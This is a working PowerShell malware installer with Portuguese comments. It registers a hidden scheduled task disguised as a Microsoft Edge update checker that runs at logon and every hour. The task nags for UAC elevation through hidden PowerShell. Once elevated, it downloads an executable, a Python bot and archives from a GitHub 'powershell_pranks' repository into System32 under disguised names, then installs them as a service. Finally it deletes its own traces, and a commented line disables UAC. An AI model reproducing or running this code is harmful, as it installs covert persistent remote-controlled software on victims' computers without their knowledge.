$taskName = "MicrosoftEdgeUpdateChecker{C599C82-62E9-42CB-98E3-683A5482339}"
$sessionUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$perFolder = Join-Path $env:APPDATA "ObvServer"
$perCheck = Join-Path $perFolder "perCheck.ps1"
$perCheckVbs = Join-Path $perFolder "perCheck.vbs"
$run = Join-Path $env:APPDATA "run.ps1"
$destino = 'C:\Windows\System32\Int-service.exe'
$destino2 = 'C:\Windows\System32\ap32\log.py'
$destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
$destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
$destino5 = 'C:\Windows\System32\ap32\scripts.zip'
$destino6 = 'C:\Windows\System32\Int-service.xml'
$destino7 = 'C:\Windows\System32\ap32\token.txt'

# --- CRIAÇÃO DO FICHEIRO vbs ---
$vbsContent = @"
CreateObject("Shell.Application").ShellExecute _
    "powershell.exe", _
    "-W Hidden -EP Bypass -File ""$perCheck""", _
    "", "runas", 0
"@

# --- CRIAÇÃO DO FICHEIRO PS1 ---
$conteudo = @"
param(
    [switch]`$Elevated
)

function Test-IsAdmin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin) -and -not `$Elevated) {
    try {
        `$argList = @(
            "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden",
            "-File", `$PSCommandPath,
            "-Elevated"
        )
        Start-Process powershell.exe -Verb RunAs -ArgumentList `$argList -ErrorAction Stop

        exit
    }
    catch {
        # UTILIZADOR CANCELOU O UAC
        exit
    }
}

if (Test-IsAdmin) {

    # UTILIZADOR ACEITOU O UAC
    # COMANDOS COM ADMIN

    if (Test-Path "C:\Windows\System32\re-as") {
        Remove-Item "C:\Windows\System32\re-as" -Recurse -Force
    }

    if (Test-Path "C:\Windows\System32\ap32") {
        Remove-Item "C:\Windows\System32\ap32" -Recurse -Force
    }

    if (Test-Path "C:\Windows\System32\Int-service.exe") {
        Remove-Item "C:\Windows\System32\Int-service.exe" -Force
    }

    if (Test-Path "C:\Windows\System32\Int-service.xml") {
        Remove-Item "C:\Windows\System32\Int-service.xml" -Force
    }

    New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
    New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory

    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/Int-service.exe?dl=1" -OutFile $destino
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/bot.py?dl=1" -OutFile $destino2
    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/Int-service.xml?dl=1" -OutFile $destino6
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/token.txt?dl=1" -OutFile $destino7

    Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\re-as" -Force
    Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\re-as" -Force
    Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32" -Force

    Copy-Item -Path "C:\Windows\System32\ap32\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force

    Remove-Item "C:\Windows\System32\re-as\WPy64.zip" -Force
    Remove-Item "C:\Windows\System32\re-as\WPy64_2.zip" -Force
    Remove-Item "C:\Windows\System32\ap32\scripts.zip" -Force
    Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force

    C:\Windows\System32\Int-service.exe install
    C:\Windows\System32\Int-service.exe start

    #New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false
    
    Remove-Item $perFolder -Recurse -Force
    
    if (Test-Path $run) {
        Remove-Item $run -Force
    }
    exit
}
"@


if (Test-Path $perFolder) {
    Remove-Item $perFolder -Force
}

New-Item -Path $perFolder -ItemType Directory

Set-Content -Path $perCheck -Value $conteudo -Encoding UTF8
Set-Content -Path $perCheckVbs -Value $vbsContent -Encoding ASCII


# Criar ação da tarefa
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

    if ($existingTask) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    $action = New-ScheduledTaskAction -Execute "$perCheckVbs"

    # Criar trigger para rodar quando o computador iniciar
    $startupTrigger = New-ScheduledTaskTrigger -AtLogOn -User $sessionUser
    # Criar trigger para rodar de hora em hora
    $hourlyTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddHours(1) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)

    # Registrar tarefa oculta com triggers de startup e de hora em hora
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $startupTrigger,$hourlyTrigger -User $sessionUser -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

    # Rodar a tarefa
    #Start-ScheduledTask -TaskName $taskName

if (Test-Path $run) {
    Remove-Item $run -Force
}    
